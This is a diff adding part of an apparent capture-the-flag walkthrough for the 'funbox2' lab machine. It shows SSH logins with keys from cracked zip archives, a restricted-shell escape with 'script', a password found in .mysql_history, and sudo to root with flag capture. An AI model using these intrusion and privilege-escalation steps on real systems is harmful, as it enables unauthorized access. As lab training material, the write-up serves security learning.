@@ -340,5 +340,126 @@ SSH Keys
 ```shell
 > unzip -P catwoman cathrine.zip
 Archive:  cathrine.zip
-  inflating: id_rsa                  
+  inflating: id_rsa
+> chmod 600 id_rsa                                                                                                                                             
+> ssh -i id_rsa cathrine@192.168.172.107                                                                                                                       
+Connection closed by 192.168.172.107 port 22                
+```
+
+```shell
+> unzip -P iubire tom.zip                                                                                                                                      
+Archive:  tom.zip                                                                                                                                              
+  inflating: id_rsa                                                                                                                                            
+> chmod 600 id_rsa                                                                                                                                             
+> ssh -i id_rsa tom@192.168.172.107
+```
+
+```shell
+tom@funbox2:~$ ls -lah
+total 44K
+drwxr-xr-x 5 tom  tom  4.0K Aug  9 08:03 .
+drwxr-xr-x 3 root root 4.0K Jul 25  2020 ..
+-rw------- 1 tom  tom     5 Aug  9 08:05 .bash_history
+-rw-r--r-- 1 tom  tom   220 Apr  4  2018 .bash_logout
+-rw-r--r-- 1 tom  tom  3.7K Apr  4  2018 .bashrc
+drwx------ 2 tom  tom  4.0K Aug  9 08:03 .cache
+drwx------ 3 tom  tom  4.0K Jul 25  2020 .gnupg
+-rw-r--r-- 1 tom  tom    33 Aug  9 05:39 local.txt
+-rw------- 1 tom  tom   295 Jul 25  2020 .mysql_history
+-rw-r--r-- 1 tom  tom   807 Apr  4  2018 .profile
+drwx------ 2 tom  tom  4.0K Jul 25  2020 .ssh
+```
+
+Restricted Bash
+```shell
+tom@funbox2:~$ script /dev/null -c bash
+Script started, file is /dev/null
+To run a command as administrator (user "root"), use "sudo <command>".
+See "man sudo_root" for details.
+
+tom@funbox2:~$ cat local.txt 
+*63464da9e2248378ab066d46c473827
+```
+
+```shell
+tom@funbox2:~$ cat .mysql_history 
+_HiStOrY_V2_
+show\040databases;
+quit
+create\040database\040'support';
+create\040database\040support;
+use\040support
+create\040table\040users;
+show\040tables
+;
+select\040*\040from\040support
+;
+show\040tables;
+select\040*\040from\040support;
+insert\040into\040support\040(tom,\040xx11yy22!);
+quit
+```
+
+```sql
+tom@funbox2:~$ mysql -u tom -p                                                                                                                                 
+Enter password:                                                                                                                                                
+Welcome to the MySQL monitor.  Commands end with ; or \g.
+Your MySQL connection id is 2
+Server version: 5.7.31-0ubuntu0.18.04.1 (Ubuntu)
+
+Copyright (c) 2000, 2020, Oracle and/or its affiliates. All rights reserved.
+
+Oracle is a registered trademark of Oracle Corporation and/or its
+affiliates. Other names may be trademarks of their respective
+owners.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+mysql> show databases;
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| mysql              |
+| performance_schema |
+| support            |
+| sys                |
++--------------------+
+5 rows in set (0.00 sec)
+
+mysql> use support;
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+mysql> show tables;
++-------------------+
+| Tables_in_support |
++-------------------+
+| support           |
++-------------------+
+1 row in set (0.00 sec)
+
+mysql> select * from support;
+Empty set (0.00 sec)
+```
+
+```shell
+tom@funbox2:~$ sudo -l
+[sudo] password for tom: 
+Matching Defaults entries for tom on funbox2:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User tom may run the following commands on funbox2:
+    (ALL : ALL) ALL
+```
+
+```shell
+tom@funbox2:~$ sudo -i
+root@funbox2:~# ls
+flag.txt  proof.txt
+root@funbox2:~# cat flag.txt
+Your flag is in another file...
+root@funbox2:~# cat proof.txt
+*6ff20a9e05c5529d2fa524377a026e2
 ```
